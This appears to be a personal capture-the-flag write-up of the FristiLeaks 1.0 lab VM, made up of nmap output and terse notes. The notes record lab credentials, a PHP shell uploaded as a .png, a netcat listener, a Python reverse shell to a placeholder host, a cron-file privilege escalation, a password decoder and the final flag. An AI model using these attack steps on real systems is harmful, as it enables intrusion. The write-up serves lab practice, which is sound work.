@@ -1,0 +1,212 @@
+nmap -T4 -A -v 10.0.2.30
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 04:39 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating ARP Ping Scan at 04:39
+Scanning 10.0.2.30 [1 port]
+Completed ARP Ping Scan at 04:39, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 04:39
+Completed Parallel DNS resolution of 1 host. at 04:39, 0.00s elapsed
+Initiating SYN Stealth Scan at 04:39
+Scanning 10.0.2.30 [1000 ports]
+Discovered open port 80/tcp on 10.0.2.30
+Completed SYN Stealth Scan at 04:39, 5.05s elapsed (1000 total ports)
+Initiating Service scan at 04:39
+Scanning 1 service on 10.0.2.30
+Completed Service scan at 04:39, 6.02s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 10.0.2.30
+NSE: Script scanning 10.0.2.30.
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.12s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Nmap scan report for 10.0.2.30
+Host is up (0.00043s latency).
+Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Uptime guess: 0.003 days (since Tue Jul  5 04:35:16 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.43 ms 10.0.2.30
+
+NSE: Script Post-scanning.
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Initiating NSE at 04:39
+Completed NSE at 04:39, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
+           Raw packets sent: 2025 (90.890KB) | Rcvd: 29 (2.414KB)
+           
+           
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+           
+http://10.0.2.30/fristi/
+
+go to decrypte base64 hash to png
+
+base64 -d passwd.txt > decrypt64.png
+
+keKkeKKeKKeKkEkkEk
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+
+username -> eezeepz
+password -> keKkeKKeKKeKkEkkEk
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+
+nc -nvlp 1234
+
+http://10.0.2.30/fristi/uploads/shell.php.png
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+
+
+
+cd home
+cd eezeepz
+ls
+cat notes.txt
+
+
+Yo EZ,
+
+I made it possible for you to do some automated checks, 
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+
+
+to open shell -> python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+
+echo "/usr/bin/python /tmp/pythonshell.py" > runthis
+
+
+here is the reverse shell code;
+dont forget to listen with netcat.
+
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("X.X.X.X",8080))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+
+
+
+
+cat cryptedpass.txt ->  mVGZ3O3omkJLmy2pcuTq
+
+cat whoisyourgodnow.txt -> =RFn0AKnlMHMPIzpyuTI0ITG
+
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||           
+
+Change this file:
+
+
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+
+
+----------------------------------------------------
+Now you can decode passwords:
+
+
+import base64,codecs,sys
+
+def decodeString(str):
+    decodedString = codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(decodedString)
+
+cryptoResult=decodeString(sys.argv[1])
+print (cryptoResult)
+
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+To open new shell;
+wget http://10.0.2.X/pythonShell.py           
+
+Decrypted passwords:
+
+thisisalsopw123
+
+LetThereBeFristi!
+
+
+sudo -u fristi ./doCom /usr/bin/python /var/fristigod/.secret_admin_stuff/pythonShell.py 
+
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+
+cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+
